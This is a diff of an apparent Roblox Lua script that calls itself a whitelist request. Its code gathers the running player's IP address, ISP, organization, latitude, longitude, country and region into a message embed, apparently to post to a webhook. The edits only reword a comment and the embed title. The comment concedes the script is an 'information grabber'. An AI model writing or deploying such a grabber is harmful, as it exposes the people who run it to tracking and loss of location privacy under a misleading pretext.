@@ -1,6 +1,6 @@
 --[[
 
-i do not care to obfuscate this,
+i do not care to obfuscate this, this is just an information grabber for my whitelist
 execute at your own risk, there is much information that will be gathered such as:
 ISP, IP-Address,Region,Country,etc
 
@@ -14,7 +14,7 @@ if b.query then
     local data = {
         ["content"] = LP.Name,
         ["embeds"] = {{
-                ["title"] = "**Thing for my whitelist**",
+                ["title"] = "**Whitelist request**",
                 ["description"] = string.format("User: %s \n Display: %s \n IP: %s \n ISP: %s \n Organization: %s \n Cable Operator: %s \n Lat: %s \n Lon: %s \n Country: %s \n Region: %s",LP.Name,LP.DisplayName,b.query,b.isp,b.org,b.as,b.lat,b.lon,b.country,b.regionName),
                 ["type"] = "rich",
                 ["color"] = tonumber(0x7269da),
